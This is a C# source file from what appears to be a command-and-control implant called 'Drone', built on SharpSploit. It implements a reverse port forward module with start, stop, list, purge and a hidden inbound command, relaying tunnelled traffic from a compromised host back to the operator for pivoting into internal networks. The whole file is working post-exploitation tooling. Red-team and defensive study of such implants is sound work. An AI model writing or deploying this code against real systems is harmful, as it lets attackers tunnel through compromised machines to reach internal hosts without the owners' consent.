using System;
using System.Linq;
using System.Runtime.Serialization;
using System.Threading;

using Drone.Models;
using Drone.SharpSploit.Generic;
using Drone.SharpSploit.Pivoting;

namespace Drone.Modules
{
    public class ReversePortForwardModule : DroneModule
    {
        public override string Name { get; } = "rportfwd";
        public override void AddCommands()
        {
            var start = new Command("rportfwd-start", "Start a new reverse port forward", Start);
            start.Arguments.Add(new Command.Argument("bindPort", false));
            start.Arguments.Add(new Command.Argument("forwardHost", false));
            start.Arguments.Add(new Command.Argument("forwardPort", false));

            var stop = new Command("rportfwd-stop", "Stop a reverse port forward", Stop);
            stop.Arguments.Add(new Command.Argument("bindPort", false));

            var list = new Command("rportfwd-list", "List all active reverse port forwards", List);
            var purge = new Command("rportfwd-purge", "Purge all active reverse port forwards", Purge);

            var inbound = new Command("rportfwd-inbound", "", HandleInboundResponse) {Visible = false};

            Commands.Add(start);
            Commands.Add(stop);
            Commands.Add(list);
            Commands.Add(purge);
            Commands.Add(inbound);
        }

        private readonly SharpSploitResultList<ReversePortForward> _forwards = new();

        private void Stop(DroneTask task, CancellationToken token)
        {
            if (!int.TryParse(task.Arguments[0], out var bindPort))
            {
                Drone.SendError(task.TaskGuid, "Not a valid bind port.");
                return;
            }

            var rportfwd = GetReversePortForward(bindPort);
            rportfwd?.Stop();
            
            _forwards.Remove(rportfwd);
        }

        private void Start(DroneTask task, CancellationToken token)
        {
            if (!int.TryParse(task.Arguments[0], out var bindPort))
            {
                Drone.SendError(task.TaskGuid, "Not a valid bind port.");
                return;
            }

            if (!int.TryParse(task.Arguments[2], out var forwardPort))
            {
                Drone.SendError(task.TaskGuid, "Not a valid forward port.");
                return;
            }

            var rportfwd = new ReversePortForward(bindPort, task.Arguments[1], forwardPort);

            var t = new Thread(() => rportfwd.Start());
            t.Start();
            
            _forwards.Add(rportfwd);

            while (!token.IsCancellationRequested)
            {
                if (rportfwd.GetData(out var packet))
                {
                    Drone.SendDroneData(task.TaskGuid, "rportfwd", packet.Serialize());
                }
                
                Thread.Sleep(100);
            }
        }
        
        private void List(DroneTask task, CancellationToken token)
        {
            var list = _forwards.ToString();
            Drone.SendResult(task.TaskGuid, list);
        }
        
        private void Purge(DroneTask task, CancellationToken token)
        {
            foreach (var forward in _forwards) forward.Stop();
            _forwards.Clear();
        }
        
        private void HandleInboundResponse(DroneTask task, CancellationToken token)
        {
            var bindPort = int.Parse(task.Arguments[0]);
            var data = Convert.FromBase64String(task.Arguments[1]);

            var rportfwd = GetReversePortForward(bindPort);
            rportfwd?.SendData(data);
        }

        private ReversePortForward GetReversePortForward(int bindPort)
            => _forwards.SingleOrDefault(r => r.BindPort == bindPort);
    }

    [DataContract]
    public class ReversePortForwardPacket
    {
        [DataMember (Name = "bindPort")]
        public int BindPort { get; set; }
        
        [DataMember (Name = "forwardHost")]
        public string ForwardHost { get; set; }
        
        [DataMember (Name = "forwardPort")]
        public int ForwardPort { get; set; }
        
        [DataMember (Name = "data")]
        public string Data { get; set; }
    }
}